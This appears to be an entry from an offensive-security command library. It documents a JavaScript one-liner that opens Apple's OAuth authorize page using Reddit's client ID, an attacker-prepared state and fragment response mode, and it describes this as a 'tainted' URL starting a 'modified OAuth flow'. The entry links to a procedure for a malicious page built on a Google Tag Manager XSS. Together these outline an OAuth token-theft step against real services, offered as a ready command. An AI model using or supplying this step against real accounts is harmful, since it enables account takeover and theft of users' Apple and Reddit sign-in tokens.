---
data: >-
  b=window.open('https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state='+
  state +'&scope=&response_mode=fragment&m=12&v=1.5.4');
tags:
  - oauth
  - popup
type: command
executor: javascript
platforms:
  - Web
id: 9327b886-d0a6-4cbf-9ef8-fd233ca68d2a
created_at: '2025-12-14T00:11:25.313Z'
updated_at: '2025-12-14T00:11:25.313Z'
verified: false
validated: true
submitted: true
---
# open-appleid-authorize

## Command

```javascript
b=window.open('https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state='+ state +'&scope=&response_mode=fragment&m=12&v=1.5.4');
```

## Description

Opens a popup window to the tainted Apple authorization URL to initiate the modified OAuth flow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `state` | Attacker's prepared state | Yes |
| `response_mode` | fragment - returns tokens in URL fragment | Yes |
| `response_type` | code+id_token - requests both code and id_token | Yes |

## Examples

### Basic Usage

```javascript
b=window.open('https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=abc123&scope=&response_mode=fragment&m=12&v=1.5.4');
```

## Expected Output

Opens Apple sign-in popup, redirects with tokens in fragment upon completion.

## Related

- [[procedures/Create-Malicious-Page-with-GTM-XSS]]
